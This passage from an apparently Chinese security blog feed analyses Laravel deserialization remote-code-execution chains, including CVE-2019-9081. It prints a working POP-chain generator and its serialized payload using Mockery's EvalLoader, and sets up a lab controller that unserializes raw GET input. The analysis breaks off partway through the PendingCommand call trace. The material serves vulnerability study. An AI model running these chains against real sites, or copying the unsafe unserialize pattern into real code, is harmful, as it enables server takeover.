class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $connection;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = [<span class="keyword">new</span> \Mockery\Loader\EvalLoader(), <span class="string">'load'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $evilCode;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $name = <span class="string">'abcdefg'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">code</span> = "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>(); <span class="keyword">exit</span>; <span class="meta">?&gt;</span><span class="string">";</span></span><br><span class="line"><span class="string">$exp = new \Illuminate\Broadcasting\PendingBroadcast($code);</span></span><br><span class="line"><span class="string">echo serialize($exp);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>构造输出结果 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;S:<span class="number">9</span>:<span class="string">"\00*\00events"</span>;O:<span class="number">25</span>:<span class="string">"Illuminate\Bus\Dispatcher"</span>:<span class="number">1</span>:&#123;S:<span class="number">16</span>:<span class="string">"\00*\00queueResolver"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">25</span>:<span class="string">"Mockery\Loader\EvalLoader"</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;S:<span class="number">4</span>:<span class="string">"load"</span>;&#125;&#125;S:<span class="number">8</span>:<span class="string">"\00*\00event"</span>;O:<span class="number">38</span>:<span class="string">"Illuminate\Broadcasting\BroadcastEvent"</span>:<span class="number">1</span>:&#123;S:<span class="number">10</span>:<span class="string">"connection"</span>;O:<span class="number">32</span>:<span class="string">"Mockery\Generator\MockDefinition"</span>:<span class="number">2</span>:&#123;S:<span class="number">9</span>:<span class="string">"\00*\00config"</span>;O:<span class="number">35</span>:<span class="string">"Mockery\Generator\MockConfiguration"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00name"</span>;S:<span class="number">7</span>:<span class="string">"abcdefg"</span>;&#125;S:<span class="number">7</span>:<span class="string">"\00*\00code"</span>;S:<span class="number">25</span>:<span class="string">"&lt;?php phpinfo(); exit; ?&gt;"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h1><ul><li><p>危险函数的寻找</p><p>eval，call_user_func</p></li><li><p>phpstorm + xdebug 调试代码</p></li><li><p>PHP 序列化的时候 private 和 protected 变量会引入不可见字符 <code>\x00</code>，<code>\00Test\00y</code> 为 private，<code>\00*\00</code> 为 protected，注意这两个 <code>\x00</code> 就是 ascii 码为 0 的字符。这个字符显示和输出可能看不到，甚至导致截断，url 编码后就可以看得很清楚了。此时，为了更加方便进行反序列化 payload 的传输与显示，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $x=<span class="string">"peri0d"</span>;</span><br><span class="line"><span class="keyword">private</span> $y=<span class="string">"peri0d"</span>;</span><br><span class="line"><span class="keyword">protected</span> $z=<span class="string">"peri0d"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$k = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($k);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>反序列化测试代码 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 环境 : php 7.1.13 nts</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $x=<span class="string">"peri0d"</span>;</span><br><span class="line"><span class="keyword">private</span> $y=<span class="string">"peri0d"</span>;</span><br><span class="line"><span class="keyword">protected</span> $z=<span class="string">"peri0d"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$n = <span class="keyword">new</span> Test();</span><br><span class="line">var_dump(serialize($n));</span><br><span class="line">var_dump(unserialize(serialize($n))); <span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">$k = <span class="string">'O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($k)); <span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">$m = <span class="string">'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"\00Test\00y";s:6:"peri0d";s:4:"\00*\00z";s:6:"peri0d";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($m)); <span class="comment">// 失败</span></span><br><span class="line"></span><br><span class="line">$l = <span class="string">'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"Testy";s:6:"peri0d";s:4:"*z";s:6:"peri0d";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($l)); <span class="comment">// 失败</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/5911" target="_blank" rel="noopener">https://xz.aliyun.com/t/5911</a></li><li><a href="https://xz.aliyun.com/t/5866" target="_blank" rel="noopener">https://xz.aliyun.com/t/5866</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原帖地址 : &lt;a href=&quot;https://xz.aliyun.com/t/6059&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6059&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Laravel 代码审计&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="Laravel" scheme="http://yoursite.com/tags/Laravel/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 5.7 RCE (CVE-2019-9081)</title>
    <link href="http://yoursite.com/2019/08/10/Laravel%205.7%20RCE/"/>
    <id>http://yoursite.com/2019/08/10/Laravel 5.7 RCE/</id>
    <published>2019-08-10T09:34:01.880Z</published>
    <updated>2019-08-27T15:36:31.578Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel 代码审计</p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>Laravel 5.7 文档 : <a href="https://learnku.com/docs/laravel/5.7/installation/2242" target="_blank" rel="noopener">https://learnku.com/docs/laravel/5.7/installation/2242</a></p></li><li><p>Composer 下载 : <code>wget https://getcomposer.org/download/1.8.6/composer.phar</code> 获取 composer.phar</p></li><li><p>参照 <a href="https://www.jianshu.com/p/438a95046403" target="_blank" rel="noopener">https://www.jianshu.com/p/438a95046403</a> 安装 Composer 和 Laravel</p></li><li><p><code>composer create-project laravel/laravel laravel57 &quot;5.7.*&quot;</code> 安装 Laravel 5.7 并生成 <code>laravel57</code> 项目</p></li><li><p>进入项目文件夹，使用 <code>php artisan serve</code> 启动 web 服务</p><!--more--></li><li><p>在 <code>laravel57/routes/web.php</code> 文件添加路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"/"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure></li><li><p>在 <code>laravel57/app/Http/Controllers/</code> 下添加 <code>DemoController</code> 控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"peri0d"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="Laravel-项目文件夹结构"><a href="#Laravel-项目文件夹结构" class="headerlink" title="Laravel 项目文件夹结构"></a>Laravel 项目文件夹结构</h1><ul><li>app : 包含了应用的核心代码<ul><li>Broadcasting : 包含应用程序的所有广播频道类，默认不存在</li><li>Console : 包含了所有自定义的 Artisan 命令</li><li>Events : 存放了 事件类。可以使用事件来提醒应用其他部分发生了特定的操作，使应用程序更加的灵活和解耦。默认不存在</li><li>Exceptions : 包含了应用的异常处理器，也是应用抛出异常的好地方</li><li>Http : 包含了控制器、中间件和表单请求。几乎所有的进入应用的请求的处理逻辑都被放在这里</li><li>Jobs : 存放了应用中的 队列任务 。 应用的任务可以被推送到队列或者在当前请求的生命周期内同步运行。在当前请求期间同步运行的任务可以看做是一个「命令」，因为它们是 命令模式 的实现。默认不存在</li><li>Listeners : 包含了用来处理 事件 的类。事件监听器接收事件实例并执行响应该事件被触发的逻辑。默认不存在</li><li>Mail : 包含应用所有的邮件发送类。默认不存在</li><li>Notifications : 包含应用发送的所有「业务性」通知，比如关于在应用中发生的事件的简单通知。默认不存在</li><li>Policies : 包含了应用的授权策略类。策略可以用来决定一个用户是否有权限去操作指定资源。默认不存在</li><li>Providers : 包含应用的所有服务提供者。服务提供者通过在服务容器中绑定服务、注册事件、以及执行其他任务来为即将到来的请求做准备来启动应用。</li><li>Rules : 包含应用自定义验证规则对象。这些规则意在将复杂的验证逻辑封装在一个简单的对象中。默认不存在</li></ul></li><li>bootstrap : 包含启动框架的 <code>app.php</code> ，还包含 <code>cache</code> 目录，其下存放框架生成的用来提升性能的文件，比如路由和服务缓存文件</li><li>config : 包含应用程序所有的配置文件</li><li>database : 包含数据填充和迁移文件以及模型工厂类</li><li>public : 包含入口文件 <code>index.php</code>，它是进入应用程序的所有请求的入口点。还包含一些资源文件，比如图片、JS 和 CSS</li><li>resources : 包含了视图和未编译的资源文件(如 LESS、SASS 或 JavaScript )。此目录还包含所有的语言文件</li><li>routes : 包含了应用的所有路由定义</li><li>storage : 包含编译后的 Blade 模板、session 会话生成的文件、缓存文件以及框架生成的其他文件</li><li>tests : 包含自动化测试文件</li><li>vendor : 包含所有的 Composer 依赖包，其中也包含了 Laravel 源码</li></ul><h1 id="第一种漏洞分析"><a href="#第一种漏洞分析" class="headerlink" title="第一种漏洞分析"></a>第一种漏洞分析</h1><ul><li><p>漏洞触发点位于 <code>Illuminate/Foundation/Testing/PendingCommand.php</code> 中的 <code>run</code> 方法，该文件的功能就是命令执行并获取输出，<code>PendingCommand.php</code> 又定义了 <code>__destruct()</code> 方法，思路就是构造 payload 触发 <code>__destruct()</code> 方法进而调用 <code>run</code> 方法实现 rce</p></li><li><p>根据已有的 exp 来看，<code>PendingCommand</code> 类的属性如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app;         <span class="comment">// 一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;test;        <span class="comment">// 一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;command;     <span class="comment">// 要执行的php函数 system</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters;  <span class="comment">// 要执行的php函数的参数  array('id')</span></span><br></pre></td></tr></table></figure></li><li><p>在 <code>unserialize($code)</code> 处下断点调试，观察调用栈，发现有几个加载函数，<code>spl_autoload_call()</code> 、<code>Illuminate\Foundation\AliasLoader-&gt;load()</code> 、<code>Composer\Autoload\ClassLoader-&gt;loadClass()</code> 、<code>Composer\Autoload\includeFile()</code> 。</p></li><li><p>在加载完所需要的类后，会进入 <code>PendingCommand</code> 类的 <code>__destruct()</code> 方法。由于 <code>hasExecuted</code> 默认是 <code>false</code>，所以会去执行 <code>run()</code> 函数，<code>run()</code> 函数会在第 8 行执行命令，其代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>run()</code> 中首先执行了 <code>mockConsoleOutput()</code> ，该函数主要功能就是模拟控制台输出，此时又会加载一些所需要的类。代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [(<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line">                <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>mockConsoleOutput()</code> 中又调用了 <code>createABufferedOutputMock()</code> 。在 <code>createABufferedOutputMock()</code> 函数中，首先调用 <code>mock()</code> 函数，它的作用主要是进行对象模拟。然后进入循环，要遍历 <code>$this-&gt;test</code> 类的 <code>expectedOutput</code> 属性，但是在可以实例化的类中不存在这个属性。当访问一个类中不存在的属性时会触发 <code>__get()</code> ，通过去触发 <code>__get()</code> 方法去进一步构造 pop 链。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">        -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">        -&gt;shouldIgnoreMissing();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with($output, Mockery::any())</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $mock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里选择 <code>Illuminate\Auth\GenericUser</code>，其 <code>__get()</code> 魔术方法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;attributes[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>此时 <code>$this-&gt;test</code> 是我们传入的 <code>Illuminate\Auth\GenericUser</code> 的实例化对象，则 <code>$this-&gt;attributes[$key]</code> 通过反序列化是可控的，因此我们可以构造<code>$this-&gt;attributes</code>键名为<code>expectedOutput</code>的数组。这样一来<code>$this-&gt;test-&gt;expectedOutput</code>就会返回<code>$this-&gt;attributes</code>中键名为<code>expectedOutput</code>的数组</p></li><li><p>回到 <code>mockConsoleOutput()</code> 中，又进行了一次 for 循环，调用了 <code>$this-&gt;test-&gt;expectedQuestions</code> ，循环体与 <code>createABufferedOutputMock()</code> 大致相同，所以可以构造 <code>$this-&gt;attributes</code>键名为<code>expectedQuestions</code>的数组绕过</p></li><li><p>然后就可以走出 <code>mockConsoleOutput()</code> 方法，进入命令执行的关键点 <code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> ，这里 <code>Kernel::class</code> 是个固定值，为 <code>Illuminate\Contracts\Console\Kernel</code> ，这里需要搞清楚 <code>$this-&gt;app[Kernel::class]</code> ，可以得到如下的函数调用顺序</p><ul><li><p>Container.php:1222, Illuminate\Foundation\Application-&gt;offsetGet()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;make($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Application.php:751, Illuminate\Foundation\Application-&gt;make()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Container.php:609, Illuminate\Foundation\Application-&gt;make()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Container.php:652, Illuminate\Foundation\Application-&gt;resolve()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(<span class="keyword">$this</span>-&gt;getContextualConcrete($abstract));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;with[] = $parameters;</span><br><span class="line">    $concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">    <span class="comment">// concrete = Illuminate\Foundation\Application</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = <span 